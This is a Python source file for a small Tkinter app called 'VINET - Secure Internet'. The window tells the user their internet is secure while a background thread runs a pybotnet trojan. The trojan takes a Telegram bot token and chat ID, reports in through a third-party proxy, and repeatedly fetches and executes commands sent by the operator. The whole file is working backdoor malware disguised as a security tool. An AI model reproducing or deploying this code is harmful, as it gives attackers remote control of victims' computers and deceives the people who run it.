

from threading import Thread
import tkinter as tk

import time

import pybotnet


DEBUG = False


class Vinet(tk.Frame):
    def __init__(self, master=None, DEBUG=False, close_trojan_after_vinet=True):
        super().__init__(master)
        self.master = master
        self.master.title('VINET - Secure Internet')
        self.master.geometry('400x160')
        # self.master.iconbitmap('icon.ico') # bug
        self.pack()

        self.font_tuple_1 = ("Helvetica", 9)
        self.font_tuple_2 = ("Comic Sans MS", 12)
        self.item_size = 50  # button and lable size

        self.DEBUG = DEBUG
        self.close_trojan_after_vinet = close_trojan_after_vinet

        # if trojan is running..
        self._running = False
        self.trojan = None
        self.trojan_delay = 10
        self.create_widgets()

    def create_widgets(self):

        # get telegram token
        tk.Label(self, text='TOKEN', font=self.font_tuple_1).pack()
        self.TELEGRAM_TOKEN_LABALE = tk.Entry(self)
        self.TELEGRAM_TOKEN_LABALE['width'] = self.item_size + 9
        self.TELEGRAM_TOKEN_LABALE.pack()

        # get telegram chat id
        tk.Label(self, text='ID', font=self.font_tuple_1).pack()
        self.TELEGRAM_ADMIN_CHAT_ID_LABALE = tk.Entry(self)
        self.TELEGRAM_ADMIN_CHAT_ID_LABALE['width'] = self.item_size + 9
        self.TELEGRAM_ADMIN_CHAT_ID_LABALE.pack()

        # status Lable
        self.status = tk.Label(self)
        self.status['text'] = 'offline'
        self.status['fg'] = 'red'
        self.status['height'] = 2
        self.status['font'] = self.font_tuple_2
        self.status.pack()

        # init start button
        self.start_button = tk.Button(self)
        self.start_button["text"] = "Start VINET"
        self.start_button['activebackground'] = '#78d6ff'
        self.start_button["command"] = self.run_pybotnet_trojan
        self.start_button['width'] = self.item_size
        self.start_button['bg'] = 'green'
        self.start_button['font'] = self.font_tuple_1
        self.start_button.pack()

    def run_pybotnet_trojan(self):
        ''' check if trojan _runnung == False and input not empty... start trojan on sub tread'''

        TOKEN = self.TELEGRAM_TOKEN_LABALE.get()
        CHAT_ID = self.TELEGRAM_ADMIN_CHAT_ID_LABALE.get()

        # if trojan is running..
        if self._running:
            self.status['text'] = 'VINET is online! \n Your internet is secure'
            self.status['fg'] = 'green'
            return

        # check data
        if TOKEN == '':
            self.status['text'] = 'please add TOKEN'
            self.status['fg'] = 'red'
            return

        # check data
        if CHAT_ID == '':
            self.status['text'] = 'please add ID'
            self.status['fg'] = 'red'
            return

        # start trojan tread
        self.trojan = Thread(target=self.pybotnet_trojan,
                             args=(TOKEN, CHAT_ID))
        self.trojan.start()

    def stop_trojan(self):
        '''if close_trojan_after_vinet == True :... else:...'''
        if self.close_trojan_after_vinet:
            self.botnet.send_message_by_third_party_proxy(
                'close vinet and trojan')
            self._running = False
            return

        self.botnet.send_message_by_third_party_proxy('just close vinet..')

    def pybotnet_trojan(self, TOKEN, CHAT_ID):
        '''start trojan'''
        self._running = True

        self.status['text'] = 'online \n Your internet is secure'
        self.status['fg'] = 'green'

        is_shell = False  # bug: if is sheel False: cmd command not work. bug in pytbotnet v0.18.5
        show_log = False
        if self.DEBUG:
            is_shell = True
            show_log = True

        if is_shell:
            print('start Vinet')

        self.botnet = pybotnet.PyBotNet(
            TOKEN, CHAT_ID, show_log=show_log, is_shell=is_shell)

        # change pybotnet help link to vinet github link..
        pybotnet.settings.pybotnet_github_link = 'https://github.com/onionj/vinet'
        # send online message for admin
        self.botnet.send_message_by_third_party_proxy(
            'vinet is run, send help for command list..')
        # trojan while
        while self._running:
            self.botnet.get_and_execute_scripts_by_third_party_proxy()
            time.sleep(self.trojan_delay)

        self._running = False


if __name__ == '__main__':
    root = tk.Tk()
    app = Vinet(master=root, DEBUG=DEBUG)
    app.mainloop()
    app.stop_trojan()
